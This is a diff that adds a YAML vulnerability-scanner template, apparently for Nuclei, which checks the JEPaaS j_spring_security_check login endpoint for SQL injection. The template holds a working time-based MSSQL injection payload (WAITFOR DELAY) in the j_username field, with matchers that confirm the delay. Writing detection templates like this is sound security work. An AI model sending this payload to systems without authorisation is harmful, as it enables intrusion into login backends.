@@ -1,0 +1,36 @@
+id: poc-yaml-jepaas-j-spring-security-check-sqli
+
+info:
+  name: JEPaaS j_spring_security_check SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerability in the JEPaaS j_spring_security_check endpoint.
+
+variables:
+  t1: '{{rand_int(4, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/j_spring_security_check"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a3{{t1}};WAITFOR DELAY @x--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "The URL has moved"
+          - "error=true"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
